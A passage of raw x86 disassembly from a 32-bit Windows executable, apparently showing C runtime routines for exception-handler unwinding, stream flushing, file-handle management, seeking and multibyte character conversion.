  407189:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40718c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407193:	59                   	pop    %ecx
  407194:	5f                   	pop    %edi
  407195:	5e                   	pop    %esi
  407196:	5b                   	pop    %ebx
  407197:	8b e5                	mov    %ebp,%esp
  407199:	5d                   	pop    %ebp
  40719a:	c3                   	ret
  40719b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40719e:	8b 08                	mov    (%eax),%ecx
  4071a0:	33 d2                	xor    %edx,%edx
  4071a2:	81 39 05 00 00 c0    	cmpl   $0xc0000005,(%ecx)
  4071a8:	0f 94 c2             	sete   %dl
  4071ab:	8b c2                	mov    %edx,%eax
  4071ad:	c3                   	ret
  4071ae:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4071b1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4071b8:	33 c0                	xor    %eax,%eax
  4071ba:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4071bd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4071c4:	59                   	pop    %ecx
  4071c5:	5f                   	pop    %edi
  4071c6:	5e                   	pop    %esi
  4071c7:	5b                   	pop    %ebx
  4071c8:	8b e5                	mov    %ebp,%esp
  4071ca:	5d                   	pop    %ebp
  4071cb:	c3                   	ret
  4071cc:	6a 10                	push   $0x10
  4071ce:	68 c0 d9 40 00       	push   $0x40d9c0
  4071d3:	e8 f8 d8 ff ff       	call   0x404ad0
  4071d8:	33 db                	xor    %ebx,%ebx
  4071da:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4071dd:	6a 01                	push   $0x1
  4071df:	e8 07 fb ff ff       	call   0x406ceb
  4071e4:	59                   	pop    %ecx
  4071e5:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4071e8:	6a 03                	push   $0x3
  4071ea:	5f                   	pop    %edi
  4071eb:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4071ee:	3b 3d 40 27 41 00    	cmp    0x412740,%edi
  4071f4:	7d 54                	jge    0x40724a
  4071f6:	8b f7                	mov    %edi,%esi
  4071f8:	a1 20 17 41 00       	mov    0x411720,%eax
  4071fd:	39 1c b0             	cmp    %ebx,(%eax,%esi,4)
  407200:	74 45                	je     0x407247
  407202:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  407205:	f6 40 0c 83          	testb  $0x83,0xc(%eax)
  407209:	74 0f                	je     0x40721a
  40720b:	50                   	push   %eax
  40720c:	e8 46 c7 ff ff       	call   0x403957
  407211:	59                   	pop    %ecx
  407212:	83 f8 ff             	cmp    $0xffffffff,%eax
  407215:	74 03                	je     0x40721a
  407217:	ff 45 e4             	incl   -0x1c(%ebp)
  40721a:	83 ff 14             	cmp    $0x14,%edi
  40721d:	7c 28                	jl     0x407247
  40721f:	a1 20 17 41 00       	mov    0x411720,%eax
  407224:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  407227:	83 c0 20             	add    $0x20,%eax
  40722a:	50                   	push   %eax
  40722b:	ff 15 94 b0 40 00    	call   *0x40b094
  407231:	a1 20 17 41 00       	mov    0x411720,%eax
  407236:	ff 34 b0             	push   (%eax,%esi,4)
  407239:	e8 6d c9 ff ff       	call   0x403bab
  40723e:	59                   	pop    %ecx
  40723f:	a1 20 17 41 00       	mov    0x411720,%eax
  407244:	89 1c b0             	mov    %ebx,(%eax,%esi,4)
  407247:	47                   	inc    %edi
  407248:	eb a1                	jmp    0x4071eb
  40724a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407251:	e8 09 00 00 00       	call   0x40725f
  407256:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407259:	e8 b7 d8 ff ff       	call   0x404b15
  40725e:	c3                   	ret
  40725f:	6a 01                	push   $0x1
  407261:	e8 ac f9 ff ff       	call   0x406c12
  407266:	59                   	pop    %ecx
  407267:	c3                   	ret
  407268:	cc                   	int3
  407269:	cc                   	int3
  40726a:	cc                   	int3
  40726b:	cc                   	int3
  40726c:	cc                   	int3
  40726d:	cc                   	int3
  40726e:	cc                   	int3
  40726f:	cc                   	int3
  407270:	55                   	push   %ebp
  407271:	8b ec                	mov    %esp,%ebp
  407273:	53                   	push   %ebx
  407274:	56                   	push   %esi
  407275:	57                   	push   %edi
  407276:	55                   	push   %ebp
  407277:	6a 00                	push   $0x0
  407279:	6a 00                	push   $0x0
  40727b:	68 88 72 40 00       	push   $0x407288
  407280:	ff 75 08             	push   0x8(%ebp)
  407283:	e8 9a 1f 00 00       	call   0x409222
  407288:	5d                   	pop    %ebp
  407289:	5f                   	pop    %edi
  40728a:	5e                   	pop    %esi
  40728b:	5b                   	pop    %ebx
  40728c:	8b e5                	mov    %ebp,%esp
  40728e:	5d                   	pop    %ebp
  40728f:	c3                   	ret
  407290:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407294:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  40729b:	b8 01 00 00 00       	mov    $0x1,%eax
  4072a0:	74 32                	je     0x4072d4
  4072a2:	8b 44 24 14          	mov    0x14(%esp),%eax
  4072a6:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4072a9:	33 c8                	xor    %eax,%ecx
  4072ab:	e8 ce bd ff ff       	call   0x40307e
  4072b0:	55                   	push   %ebp
  4072b1:	8b 68 10             	mov    0x10(%eax),%ebp
  4072b4:	8b 50 28             	mov    0x28(%eax),%edx
  4072b7:	52                   	push   %edx
  4072b8:	8b 50 24             	mov    0x24(%eax),%edx
  4072bb:	52                   	push   %edx
  4072bc:	e8 14 00 00 00       	call   0x4072d5
  4072c1:	83 c4 08             	add    $0x8,%esp
  4072c4:	5d                   	pop    %ebp
  4072c5:	8b 44 24 08          	mov    0x8(%esp),%eax
  4072c9:	8b 54 24 10          	mov    0x10(%esp),%edx
  4072cd:	89 02                	mov    %eax,(%edx)
  4072cf:	b8 03 00 00 00       	mov    $0x3,%eax
  4072d4:	c3                   	ret
  4072d5:	53                   	push   %ebx
  4072d6:	56                   	push   %esi
  4072d7:	57                   	push   %edi
  4072d8:	8b 44 24 10          	mov    0x10(%esp),%eax
  4072dc:	55                   	push   %ebp
  4072dd:	50                   	push   %eax
  4072de:	6a fe                	push   $0xfffffffe
  4072e0:	68 90 72 40 00       	push   $0x407290
  4072e5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  4072ec:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4072f1:	33 c4                	xor    %esp,%eax
  4072f3:	50                   	push   %eax
  4072f4:	8d 44 24 04          	lea    0x4(%esp),%eax
  4072f8:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4072fe:	8b 44 24 28          	mov    0x28(%esp),%eax
  407302:	8b 58 08             	mov    0x8(%eax),%ebx
  407305:	8b 70 0c             	mov    0xc(%eax),%esi
  407308:	83 fe ff             	cmp    $0xffffffff,%esi
  40730b:	74 3a                	je     0x407347
  40730d:	83 7c 24 2c ff       	cmpl   $0xffffffff,0x2c(%esp)
  407312:	74 06                	je     0x40731a
  407314:	3b 74 24 2c          	cmp    0x2c(%esp),%esi
  407318:	76 2d                	jbe    0x407347
  40731a:	8d 34 76             	lea    (%esi,%esi,2),%esi
  40731d:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  407320:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  407324:	89 48 0c             	mov    %ecx,0xc(%eax)
  407327:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  40732c:	75 17                	jne    0x407345
  40732e:	68 01 01 00 00       	push   $0x101
  407333:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  407337:	e8 49 00 00 00       	call   0x407385
  40733c:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  407340:	e8 5f 00 00 00       	call   0x4073a4
  407345:	eb b7                	jmp    0x4072fe
  407347:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40734b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407352:	83 c4 18             	add    $0x18,%esp
  407355:	5f                   	pop    %edi
  407356:	5e                   	pop    %esi
  407357:	5b                   	pop    %ebx
  407358:	c3                   	ret
  407359:	33 c0                	xor    %eax,%eax
  40735b:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  407362:	81 79 04 90 72 40 00 	cmpl   $0x407290,0x4(%ecx)
  407369:	75 10                	jne    0x40737b
  40736b:	8b 51 0c             	mov    0xc(%ecx),%edx
  40736e:	8b 52 0c             	mov    0xc(%edx),%edx
  407371:	39 51 08             	cmp    %edx,0x8(%ecx)
  407374:	75 05                	jne    0x40737b
  407376:	b8 01 00 00 00       	mov    $0x1,%eax
  40737b:	c3                   	ret
  40737c:	53                   	push   %ebx
  40737d:	51                   	push   %ecx
  40737e:	bb 60 f6 40 00       	mov    $0x40f660,%ebx
  407383:	eb 0b                	jmp    0x407390
  407385:	53                   	push   %ebx
  407386:	51                   	push   %ecx
  407387:	bb 60 f6 40 00       	mov    $0x40f660,%ebx
  40738c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  407390:	89 4b 08             	mov    %ecx,0x8(%ebx)
  407393:	89 43 04             	mov    %eax,0x4(%ebx)
  407396:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  407399:	55                   	push   %ebp
  40739a:	51                   	push   %ecx
  40739b:	50                   	push   %eax
  40739c:	58                   	pop    %eax
  40739d:	59                   	pop    %ecx
  40739e:	5d                   	pop    %ebp
  40739f:	59                   	pop    %ecx
  4073a0:	5b                   	pop    %ebx
  4073a1:	c2 04 00             	ret    $0x4
  4073a4:	ff d0                	call   *%eax
  4073a6:	c3                   	ret
  4073a7:	8b ff                	mov    %edi,%edi
  4073a9:	55                   	push   %ebp
  4073aa:	8b ec                	mov    %esp,%ebp
  4073ac:	51                   	push   %ecx
  4073ad:	51                   	push   %ecx
  4073ae:	8b 45 0c             	mov    0xc(%ebp),%eax
  4073b1:	56                   	push   %esi
  4073b2:	8b 75 08             	mov    0x8(%ebp),%esi
  4073b5:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4073b8:	8b 45 10             	mov    0x10(%ebp),%eax
  4073bb:	57                   	push   %edi
  4073bc:	56                   	push   %esi
  4073bd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4073c0:	e8 2c 03 00 00       	call   0x4076f1
  4073c5:	83 cf ff             	or     $0xffffffff,%edi
  4073c8:	59                   	pop    %ecx
  4073c9:	3b c7                	cmp    %edi,%eax
  4073cb:	75 11                	jne    0x4073de
  4073cd:	e8 db ce ff ff       	call   0x4042ad
  4073d2:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4073d8:	8b c7                	mov    %edi,%eax
  4073da:	8b d7                	mov    %edi,%edx
  4073dc:	eb 4a                	jmp    0x407428
  4073de:	ff 75 14             	push   0x14(%ebp)
  4073e1:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4073e4:	51                   	push   %ecx
  4073e5:	ff 75 f8             	push   -0x8(%ebp)
  4073e8:	50                   	push   %eax
  4073e9:	ff 15 68 b1 40 00    	call   *0x40b168
  4073ef:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4073f2:	3b c7                	cmp    %edi,%eax
  4073f4:	75 13                	jne    0x407409
  4073f6:	ff 15 8c b0 40 00    	call   *0x40b08c
  4073fc:	85 c0                	test   %eax,%eax
  4073fe:	74 09                	je     0x407409
  407400:	50                   	push   %eax
  407401:	e8 cd ce ff ff       	call   0x4042d3
  407406:	59                   	pop    %ecx
  407407:	eb cf                	jmp    0x4073d8
  407409:	8b c6                	mov    %esi,%eax
  40740b:	c1 f8 05             	sar    $0x5,%eax
  40740e:	8b 04 85 20 16 41 00 	mov    0x411620(,%eax,4),%eax
  407415:	83 e6 1f             	and    $0x1f,%esi
  407418:	c1 e6 06             	shl    $0x6,%esi
  40741b:	8d 44 30 04          	lea    0x4(%eax,%esi,1),%eax
  40741f:	80 20 fd             	andb   $0xfd,(%eax)
  407422:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407425:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407428:	5f                   	pop    %edi
  407429:	5e                   	pop    %esi
  40742a:	c9                   	leave
  40742b:	c3                   	ret
  40742c:	8b ff                	mov    %edi,%edi
  40742e:	55                   	push   %ebp
  40742f:	8b ec                	mov    %esp,%ebp
  407431:	8b 45 08             	mov    0x8(%ebp),%eax
  407434:	83 f8 fe             	cmp    $0xfffffffe,%eax
  407437:	75 0f                	jne    0x407448
  407439:	e8 6f ce ff ff       	call   0x4042ad
  40743e:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  407444:	33 c0                	xor    %eax,%eax
  407446:	5d                   	pop    %ebp
  407447:	c3                   	ret
  407448:	85 c0                	test   %eax,%eax
  40744a:	78 08                	js     0x407454
  40744c:	3b 05 04 16 41 00    	cmp    0x411604,%eax
  407452:	72 12                	jb     0x407466
  407454:	e8 54 ce ff ff       	call   0x4042ad
  407459:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40745f:	e8 f7 cd ff ff       	call   0x40425b
  407464:	eb de                	jmp    0x407444
  407466:	8b c8                	mov    %eax,%ecx
  407468:	83 e0 1f             	and    $0x1f,%eax
  40746b:	c1 f9 05             	sar    $0x5,%ecx
  40746e:	8b 0c 8d 20 16 41 00 	mov    0x411620(,%ecx,4),%ecx
  407475:	c1 e0 06             	shl    $0x6,%eax
  407478:	0f be 44 01 04       	movsbl 0x4(%ecx,%eax,1),%eax
  40747d:	83 e0 40             	and    $0x40,%eax
  407480:	5d                   	pop    %ebp
  407481:	c3                   	ret
  407482:	8b ff                	mov    %edi,%edi
  407484:	55                   	push   %ebp
  407485:	8b ec                	mov    %esp,%ebp
  407487:	51                   	push   %ecx
  407488:	83 3d ec fe 40 00 fe 	cmpl   $0xfffffffe,0x40feec
  40748f:	75 05                	jne    0x407496
  407491:	e8 e6 12 00 00       	call   0x40877c
  407496:	a1 ec fe 40 00       	mov    0x40feec,%eax
  40749b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40749e:	75 07                	jne    0x4074a7
  4074a0:	b8 ff ff 00 00       	mov    $0xffff,%eax
  4074a5:	c9                   	leave
  4074a6:	c3                   	ret
  4074a7:	6a 00                	push   $0x0
  4074a9:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4074ac:	51                   	push   %ecx
  4074ad:	6a 01                	push   $0x1
  4074af:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4074b2:	51                   	push   %ecx
  4074b3:	50                   	push   %eax
  4074b4:	ff 15 6c b1 40 00    	call   *0x40b16c
  4074ba:	85 c0                	test   %eax,%eax
  4074bc:	74 e2                	je     0x4074a0
  4074be:	66 8b 45 08          	mov    0x8(%ebp),%ax
  4074c2:	c9                   	leave
  4074c3:	c3                   	ret
  4074c4:	8b ff                	mov    %edi,%edi
  4074c6:	55                   	push   %ebp
  4074c7:	8b ec                	mov    %esp,%ebp
  4074c9:	83 ec 10             	sub    $0x10,%esp
  4074cc:	53                   	push   %ebx
  4074cd:	56                   	push   %esi
  4074ce:	8b 75 0c             	mov    0xc(%ebp),%esi
  4074d1:	33 db                	xor    %ebx,%ebx
  4074d3:	3b f3                	cmp    %ebx,%esi
  4074d5:	74 15                	je     0x4074ec
  4074d7:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4074da:	74 10                	je     0x4074ec
  4074dc:	38 1e                	cmp    %bl,(%esi)
  4074de:	75 12                	jne    0x4074f2
  4074e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4074e3:	3b c3                	cmp    %ebx,%eax
  4074e5:	74 05                	je     0x4074ec
  4074e7:	33 c9                	xor    %ecx,%ecx
  4074e9:	66 89 08             	mov    %cx,(%eax)
  4074ec:	33 c0                	xor    %eax,%eax
  4074ee:	5e                   	pop    %esi
  4074ef:	5b                   	pop    %ebx
  4074f0:	c9                   	leave
  4074f1:	c3                   	ret
  4074f2:	ff 75 14             	push   0x14(%ebp)
  4074f5:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4074f8:	e8 e0 e5 ff ff       	call   0x405add
  4074fd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407500:	39 58 14             	cmp    %ebx,0x14(%eax)
  407503:	75 1e                	jne    0x407523
  407505:	8b 45 08             	mov    0x8(%ebp),%eax
  407508:	3b c3                	cmp    %ebx,%eax
  40750a:	74 06                	je     0x407512
  40750c:	0f b6 0e             	movzbl (%esi),%ecx
  40750f:	66 89 08             	mov    %cx,(%eax)
  407512:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  407515:	74 07                	je     0x40751e
  407517:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40751a:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  40751e:	33 c0                	xor    %eax,%eax
  407520:	40                   	inc    %eax
  407521:	eb cb                	jmp    0x4074ee
  407523:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407526:	50                   	push   %eax
  407527:	0f b6 06             	movzbl (%esi),%eax
  40752a:	50                   	push   %eax
  40752b:	e8 c4 00 00 00       	call   0x4075f4
  407530:	59                   	pop    %ecx
  407531:	59                   	pop    %ecx
  407532:	85 c0                	test   %eax,%eax
  407534:	74 7d                	je     0x4075b3
  407536:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407539:	8b 88 ac 00 00 00    	mov    0xac(%eax),%ecx
  40753f:	83 f9 01             	cmp    $0x1,%ecx
  407542:	7e 25                	jle    0x407569
  407544:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  407547:	7c 20                	jl     0x407569
  407549:	33 d2                	xor    %edx,%edx
  40754b:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40754e:	0f 95 c2             	setne  %dl
  407551:	52                   	push   %edx
  407552:	ff 75 08             	push   0x8(%ebp)
  407555:	51                   	push   %ecx
  407556:	56                   	push   %esi
  407557:	6a 09                	push   $0x9
  407559:	ff 70 04             	push   0x4(%eax)
  40755c:	ff 15 b4 b0 40 00    	call   *0x40b0b4
  407562:	85 c0                	test   %eax,%eax
  407564:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407567:	75 10                	jne    0x407579
  407569:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40756c:	3b 88 ac 00 00 00    	cmp    0xac(%eax),%ecx
  407572:	72 20                	jb     0x407594
  407574:	38 5e 01             	cmp    %bl,0x1(%esi)
  407577:	74 1b                	je     0x407594
  407579:	8b 80 ac 00 00 00    	mov    0xac(%eax),%eax
  40757f:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  407582:	0f 84 66 ff ff ff    	je     0x4074ee
  407588:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40758b:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  40758f:	e9 5a ff ff ff       	jmp    0x4074ee
  407594:	e8 14 cd ff ff       	call   0x4042ad
  407599:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  40759f:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  4075a2:	74 07                	je     0x4075ab
  4075a4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4075a7:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  4075ab:	83 c8 ff             	or     $0xffffffff,%eax
  4075ae:	e9 3b ff ff ff       	jmp    0x4074ee
  4075b3:	33 c0                	xor    %eax,%eax
  4075b5:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4075b8:	0f 95 c0             	setne  %al
  4075bb:	50                   	push   %eax
  4075bc:	ff 75 08             	push   0x8(%ebp)
  4075bf:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4075c2:	6a 01                	push   $0x1
  4075c4:	56                   	push   %esi
  4075c5:	6a 09                	push   $0x9
  4075c7:	ff 70 04             	push   0x4(%eax)
  4075ca:	ff 15 b4 b0 40 00    	call   *0x40b0b4
  4075d0:	85 c0                	test   %eax,%eax
  4075d2:	0f 85 3a ff ff ff    	jne    0x407512
  4075d8:	eb ba                	jmp    0x407594
  4075da:	8b ff                	mov    %edi,%edi
  4075dc:	55                   	push   %ebp
  4075dd:	8b ec                	mov    %esp,%ebp
  4075df:	6a 00                	push   $0x0
  4075e1:	ff 75 10             	push   0x10(%ebp)
  4075e4:	ff 75 0c             	push   0xc(%ebp)
  4075e7:	ff 75 08             	push   0x8(%ebp)
  4075ea:	e8 d5 fe ff ff       	call   0x4074c4
  4075ef:	83 c4 10             	add    $0x10,%esp
  4075f2:	5d                   	pop    %ebp
  4075f3:	c3                   	ret
  4075f4:	8b ff                	mov    %edi,%edi
  4075f6:	55                   	push   %ebp
  4075f7:	8b ec                	mov    %esp,%ebp
  4075f9:	83 ec 10             	sub    $0x10,%esp
  4075fc:	ff 75 0c             	push   0xc(%ebp)
  4075ff:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407602:	e8 d6 e4 ff ff       	call   0x405add
  407607:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  40760b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40760e:	8b 89 c8 00 00 00    	mov    0xc8(%ecx),%ecx
  407614:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  407618:	25 00 80 00 00       	and    $0x8000,%eax
  40761d:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  407621:	74 07                	je     0x40762a
  407623:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407626:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  40762a:	c9                   	leave
  40762b:	c3                   	ret
  40762c:	8b ff                	mov    %edi,%edi
  40762e:	55                   	push   %ebp
  40762f:	8b ec                	mov    %esp,%ebp
  407631:	6a 00                	push   $0x0
  407633:	ff 75 08             	push   0x8(%ebp)
  407636:	e8 b9 ff ff ff       	call   0x4075f4
  40763b:	59                   	pop    %ecx
  40763c:	59                   	pop    %ecx
  40763d:	5d                   	pop    %ebp
  40763e:	c3                   	ret
  40763f:	cc                   	int3
  407640:	51                   	push   %ecx
  407641:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  407645:	2b c8                	sub    %eax,%ecx
  407647:	1b c0                	sbb    %eax,%eax
  407649:	f7 d0                	not    %eax
  40764b:	23 c8                	and    %eax,%ecx
  40764d:	8b c4                	mov    %esp,%eax
  40764f:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  407654:	3b c8                	cmp    %eax,%ecx
  407656:	72 0a                	jb     0x407662
  407658:	8b c1                	mov    %ecx,%eax
  40765a:	59                   	pop    %ecx
  40765b:	94                   	xchg   %eax,%esp
  40765c:	8b 00                	mov    (%eax),%eax
  40765e:	89 04 24             	mov    %eax,(%esp)
  407661:	c3                   	ret
  407662:	2d 00 10 00 00       	sub    $0x1000,%eax
  407667:	85 00                	test   %eax,(%eax)
  407669:	eb e9                	jmp    0x407654
  40766b:	8b ff                	mov    %edi,%edi
  40766d:	55                   	push   %ebp
  40766e:	8b ec                	mov    %esp,%ebp
  407670:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407673:	53                   	push   %ebx
  407674:	33 db                	xor    %ebx,%ebx
  407676:	56                   	push   %esi
  407677:	57                   	push   %edi
  407678:	3b cb                	cmp    %ebx,%ecx
  40767a:	7c 5b                	jl     0x4076d7
  40767c:	3b 0d 04 16 41 00    	cmp    0x411604,%ecx
  407682:	73 53                	jae    0x4076d7
  407684:	8b c1                	mov    %ecx,%eax
  407686:	c1 f8 05             	sar    $0x5,%eax
  407689:	8b f1                	mov    %ecx,%esi
  40768b:	83 e6 1f             	and    $0x1f,%esi
  40768e:	8d 3c 85 20 16 41 00 	lea    0x411620(,%eax,4),%edi
  407695:	8b 07                	mov    (%edi),%eax
  407697:	c1 e6 06             	shl    $0x6,%esi
  40769a:	f6 44 30 04 01       	testb  $0x1,0x4(%eax,%esi,1)
  40769f:	74 36                	je     0x4076d7
  4076a1:	83 3c 30 ff          	cmpl   $0xffffffff,(%eax,%esi,1)
  4076a5:	74 30                	je     0x4076d7
  4076a7:	83 3d a0 f0 40 00 01 	cmpl   $0x1,0x40f0a0
  4076ae:	75 1d                	jne    0x4076cd
  4076b0:	2b cb                	sub    %ebx,%ecx
  4076b2:	74 10                	je     0x4076c4
  4076b4:	49                   	dec    %ecx
  4076b5:	74 08                	je     0x4076bf
  4076b7:	49                   	dec    %ecx
  4076b8:	75 13                	jne    0x4076cd
  4076ba:	53                   	push   %ebx
  4076bb:	6a f4                	push   $0xfffffff4
  4076bd:	eb 08                	jmp    0x4076c7
  4076bf:	53                   	push   %ebx
  4076c0:	6a f5                	push   $0xfffffff5
  4076c2:	eb 03                	jmp    0x4076c7
  4076c4:	53                   	push   %ebx
  4076c5:	6a f6                	push   $0xfffffff6
  4076c7:	ff 15 70 b1 40 00    	call   *0x40b170
  4076cd:	8b 07                	mov    (%edi),%eax
  4076cf:	83 0c 06 ff          	orl    $0xffffffff,(%esi,%eax,1)
  4076d3:	33 c0                	xor    %eax,%eax
  4076d5:	eb 15                	jmp    0x4076ec
  4076d7:	e8 d1 cb ff ff       	call   0x4042ad
  4076dc:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4076e2:	e8 d9 cb ff ff       	call   0x4042c0
  4076e7:	89 18                	mov    %ebx,(%eax)
  4076e9:	83 c8 ff             	or     $0xffffffff,%eax
  4076ec:	5f                   	pop    %edi
  4076ed:	5e                   	pop    %esi
  4076ee:	5b                   	pop    %ebx
  4076ef:	5d                   	pop    %ebp
  4076f0:	c3                   	ret
  4076f1:	8b ff                	mov    %edi,%edi
  4076f3:	55                   	push   %ebp
  4076f4:	8b ec                	mov    %esp,%ebp
  4076f6:	8b 45 08             	mov    0x8(%ebp),%eax
  4076f9:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4076fc:	75 18                	jne    0x407716
  4076fe:	e8 bd cb ff ff       	call   0x4042c0
  407703:	83 20 00             	andl   $0x0,(%eax)
  407706:	e8 a2 cb ff ff       	call   0x4042ad
  40770b:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  407711:	83 c8 ff             	or     $0xffffffff,%eax
  407714:	5d                   	pop    %ebp
  407715:	c3                   	ret
  407716:	85 c0                	test   %eax,%eax
  407718:	78 08                	js     0x407722
  40771a:	3b 05 04 16 41 00    	cmp    0x411604,%eax
  407720:	72 1a                	jb     0x40773c
  407722:	e8 99 cb ff ff       	call   0x4042c0
  407727:	83 20 00             	andl   $0x0,(%eax)
  40772a:	e8 7e cb ff ff       	call   0x4042ad
  40772f:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  407735:	e8 21 cb ff ff       	call   0x40425b
  40773a:	eb d5                	jmp    0x407711
  40773c:	8b c8                	mov    %eax,%ecx
  40773e:	c1 f9 05             	sar    $0x5,%ecx
  407741:	8b 0c 8d 20 16 41 00 	mov    0x411620(,%ecx,4),%ecx
  407748:	83 e0 1f             	and    $0x1f,%eax
  40774b:	c1 e0 06             	shl    $0x6,%eax
  40774e:	f6 44 08 04 01       	testb  $0x1,0x4(%eax,%ecx,1)
  407753:	74 cd                	je     0x407722
  407755:	8b 04 08             	mov    (%eax,%ecx,1),%eax
  407758:	5d                   	pop    %ebp
  407759:	c3                   	ret
  40775a:	6a 0c                	push   $0xc
  40775c:	68 e0 d9 40 00       	push   $0x40d9e0
  407761:	e8 6a d3 ff ff       	call   0x404ad0
  407766:	8b 7d 08             	mov    0x8(%ebp),%edi
  407769:	8b c7                	mov    %edi,%eax
  40776b:	c1 f8 05             	sar    $0x5,%eax
  40776e:	8b f7                	mov    %edi,%esi
  407770:	83 e6 1f             	and    $0x1f,%esi
  407773:	c1 e6 06             	shl    $0x6,%esi
  407776:	03 34 85 20 16 41 00 	add    0x411620(,%eax,4),%esi
  40777d:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  407784:	33 db                	xor    %ebx,%ebx
  407786:	39 5e 08             	cmp    %ebx,0x8(%esi)
  407789:	75 35                	jne    0x4077c0
  40778b:	6a 0a                	push   $0xa
  40778d:	e8 59 f5 ff ff       	call   0x406ceb
  407792:	59                   	pop    %ecx
  407793:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407796:	39 5e 08             	cmp    %ebx,0x8(%esi)
  407799:	75 19                	jne    0x4077b4
  40779b:	68 a0 0f 00 00       	push   $0xfa0
  4077a0:	8d 46 0c             	lea    0xc(%esi),%eax
  4077a3:	50                   	push   %eax
  4077a4:	ff 15 90 b0 40 00    	call   *0x40b090
  4077aa:	85 c0                	test   %eax,%eax
  4077ac:	75 03                	jne    0x4077b1
  4077ae:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4077b1:	ff 46 08             	incl   0x8(%esi)
  4077b4:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4077bb:	e8 30 00 00 00       	call   0x4077f0
  4077c0:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4077c3:	74 1d                	je     0x4077e2
  4077c5:	8b c7                	mov    %edi,%eax
  4077c7:	c1 f8 05             	sar    $0x5,%eax
  4077ca:	83 e7 1f             	and    $0x1f,%edi
  4077cd:	c1 e7 06             	shl    $0x6,%edi
  4077d0:	8b 04 85 20 16 41 00 	mov    0x411620(,%eax,4),%eax
  4077d7:	8d 44 38 0c          	lea    0xc(%eax,%edi,1),%eax
  4077db:	50                   	push   %eax
  4077dc:	ff 15 84 b0 40 00    	call   *0x40b084
  4077e2:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4077e5:	e8 2b d3 ff ff       	call   0x404b15
  4077ea:	c3                   	ret
  4077eb:	33 db                	xor    %ebx,%ebx
  4077ed:	8b 7d 08             	mov    0x8(%ebp),%edi
  4077f0:	6a 0a                	push   $0xa
